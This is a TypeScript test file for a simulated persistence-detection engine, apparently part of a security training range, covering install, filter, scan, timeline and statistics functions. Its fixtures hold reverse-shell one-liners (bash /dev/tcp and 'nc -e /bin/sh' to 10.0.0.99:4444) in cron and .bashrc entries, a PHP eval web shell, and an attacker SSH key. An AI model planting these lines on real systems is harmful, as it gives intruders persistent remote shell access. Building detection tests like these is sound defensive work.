/**
 * VARIANT — Persistence Engine tests
 */
import { describe, it, expect } from 'vitest';
import { createPersistenceEngine } from '../../../src/lib/persistence/persistence-engine';
import type { PersistenceMechanism } from '../../../src/lib/persistence/types';

function makeMechanism(overrides?: Partial<PersistenceMechanism>): PersistenceMechanism {
    return {
        id: 'persist-1',
        type: 'cron',
        name: 'Reverse shell cron',
        description: 'Crontab entry for reverse shell',
        machine: 'web-01',
        path: '/var/spool/cron/crontabs/root',
        content: '*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"',
        owner: 'root',
        installedAtTick: 100,
        detectable: true,
        detectionDifficulty: 'easy',
        mitreTechnique: 'T1053.003',
        mitreTactic: 'persistence',
        surviveReboot: true,
        ...overrides,
    };
}

describe('PersistenceEngine', () => {
    // ── Creation ──────────────────────────────────────────

    it('creates with empty state', () => {
        const pe = createPersistenceEngine();
        expect(pe.getAll()).toHaveLength(0);
        expect(pe.getSignatures().length).toBeGreaterThan(0); // Built-in signatures
    });

    // ── Install / Remove ──────────────────────────────────

    it('installs a persistence mechanism', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism());
        expect(pe.getAll()).toHaveLength(1);
        expect(pe.getAll()[0]!.name).toBe('Reverse shell cron');
    });

    it('removes a persistence mechanism', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({ id: 'p1' }));
        pe.install(makeMechanism({ id: 'p2', type: 'bashrc' }));
        expect(pe.getAll()).toHaveLength(2);
        expect(pe.remove('p1')).toBe(true);
        expect(pe.getAll()).toHaveLength(1);
        expect(pe.remove('nonexistent')).toBe(false);
    });

    // ── Filtering ─────────────────────────────────────────

    it('filters by machine', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({ id: 'p1', machine: 'web-01' }));
        pe.install(makeMechanism({ id: 'p2', machine: 'db-01' }));
        pe.install(makeMechanism({ id: 'p3', machine: 'web-01' }));
        expect(pe.getByMachine('web-01')).toHaveLength(2);
        expect(pe.getByMachine('db-01')).toHaveLength(1);
    });

    it('filters by type', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({ id: 'p1', type: 'cron' }));
        pe.install(makeMechanism({ id: 'p2', type: 'ssh-authorized-key' }));
        pe.install(makeMechanism({ id: 'p3', type: 'cron' }));
        expect(pe.getByType('cron')).toHaveLength(2);
        expect(pe.getByType('ssh-authorized-key')).toHaveLength(1);
    });

    // ── Detection Scanning ────────────────────────────────

    it('detects cron persistence via file-exists indicator', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({
            id: 'cron-backdoor',
            type: 'cron',
            path: '/var/spool/cron/crontabs/root',
            content: '*/5 * * * * nc -e /bin/sh 10.0.0.99 4444',
            detectable: true,
        }));

        const vfs = (path: string) => {
            if (path === '/var/spool/cron/crontabs/root') {
                return '*/5 * * * * nc -e /bin/sh 10.0.0.99 4444';
            }
            return null;
        };

        const results = pe.scan('web-01', vfs);
        expect(results.length).toBeGreaterThanOrEqual(1);
        expect(results[0]!.mechanism.id).toBe('cron-backdoor');
        expect(results[0]!.confidence).toBeGreaterThan(0);
    });

    it('detects SSH authorized key persistence', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({
            id: 'ssh-key-1',
            type: 'ssh-authorized-key',
            path: '/root/.ssh/authorized_keys',
            content: 'ssh-rsa AAAAB3... attacker@evil.com',
            machine: 'web-01',
        }));

        const vfs = (path: string) => {
            if (path === '/root/.ssh/authorized_keys') {
                return 'ssh-rsa AAAAB3... attacker@evil.com';
            }
            return null;
        };

        const results = pe.scan('web-01', vfs);
        expect(results.length).toBeGreaterThanOrEqual(1);
    });

    it('detects web shell persistence', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({
            id: 'webshell-1',
            type: 'web-shell',
            path: '/var/www/html/uploads/shell.php',
            content: '<?php eval($_POST["cmd"]); ?>',
            machine: 'web-01',
        }));

        const vfs = (path: string) => {
            if (path === '/var/www/html/uploads/shell.php') {
                return '<?php eval($_POST["cmd"]); ?>';
            }
            return null;
        };

        const results = pe.scan('web-01', vfs);
        expect(results.length).toBeGreaterThanOrEqual(1);
    });

    it('skips non-detectable mechanisms', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({
            id: 'stealthy-1',
            type: 'kernel-module',
            detectable: false,
        }));

        const results = pe.scan('web-01', () => null);
        expect(results).toHaveLength(0);
    });

    it('does not false-positive on different machines', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({ id: 'p1', machine: 'web-01' }));
        const results = pe.scan('db-01', () => null);
        expect(results).toHaveLength(0);
    });

    // ── Custom Signatures ─────────────────────────────────

    it('registers custom detection signatures', () => {
        const pe = createPersistenceEngine();
        const initialCount = pe.getSignatures().length;
        pe.addSignature({
            id: 'custom-sig-1',
            name: 'Custom backdoor detector',
            description: 'Detects custom backdoor type',
            mechanismType: 'backdoor-binary',
            indicators: [
                { type: 'file-exists', path: '/usr/local/bin/backdoor' },
            ],
            severity: 'critical',
            mitreTechnique: 'T1543',
            falsePositiveRate: 'low',
        });
        expect(pe.getSignatures().length).toBe(initialCount + 1);
    });

    // ── Timeline ──────────────────────────────────────────

    it('generates forensic timeline sorted by tick', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({ id: 'p1', installedAtTick: 300 }));
        pe.install(makeMechanism({ id: 'p2', installedAtTick: 100 }));
        pe.install(makeMechanism({ id: 'p3', installedAtTick: 200 }));

        const timeline = pe.timeline();
        expect(timeline).toHaveLength(3);
        expect(timeline[0]!.installedAtTick).toBeLessThanOrEqual(timeline[1]!.installedAtTick);
        expect(timeline[1]!.installedAtTick).toBeLessThanOrEqual(timeline[2]!.installedAtTick);
    });

    // ── VFS Overlay ───────────────────────────────────────

    it('generates VFS overlay for a machine', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({
            id: 'p1', machine: 'web-01',
            path: '/etc/cron.d/backdoor',
            content: '* * * * * root /tmp/evil.sh',
        }));
        pe.install(makeMechanism({
            id: 'p2', machine: 'web-01',
            path: '/root/.bashrc',
            content: 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1',
            type: 'bashrc',
        }));
        pe.install(makeMechanism({ id: 'p3', machine: 'db-01' }));

        const overlay = pe.generateOverlay('web-01');
        expect(Object.keys(overlay)).toHaveLength(2);
        expect(overlay['/etc/cron.d/backdoor']).toContain('evil.sh');
        expect(overlay['/root/.bashrc']).toContain('dev/tcp');
    });

    // ── Stats ─────────────────────────────────────────────

    it('reports statistics', () => {
        const pe = createPersistenceEngine();
        pe.install(makeMechanism({ id: 'p1', type: 'cron', machine: 'web-01', surviveReboot: true }));
        pe.install(makeMechanism({ id: 'p2', type: 'bashrc', machine: 'web-01', surviveReboot: true }));
        pe.install(makeMechanism({ id: 'p3', type: 'cron', machine: 'db-01', surviveReboot: false }));

        const stats = pe.getStats();
        expect(stats.totalInstalled).toBe(3);
        expect(stats.byType['cron']).toBe(2);
        expect(stats.byType['bashrc']).toBe(1);
        expect(stats.byMachine['web-01']).toBe(2);
        expect(stats.byMachine['db-01']).toBe(1);
        expect(stats.survivesReboot).toBe(2);
    });

    // ── Built-in Signatures ───────────────────────────────

    it('has comprehensive built-in detection signatures', () => {
        const pe = createPersistenceEngine();
        const sigs = pe.getSignatures();
        expect(sigs.length).toBeGreaterThanOrEqual(10);

        const types = new Set(sigs.map(s => s.mechanismType));
        expect(types.has('cron')).toBe(true);
        expect(types.has('systemd-service')).toBe(true);
        expect(types.has('ssh-authorized-key')).toBe(true);
        expect(types.has('web-shell')).toBe(true);
        expect(types.has('bashrc')).toBe(true);
    });

    it('all signatures have MITRE technique references', () => {
        const pe = createPersistenceEngine();
        for (const sig of pe.getSignatures()) {
            expect(sig.mitreTechnique).toBeTruthy();
            expect(sig.mitreTechnique).toMatch(/^T\d+/);
        }
    });
});
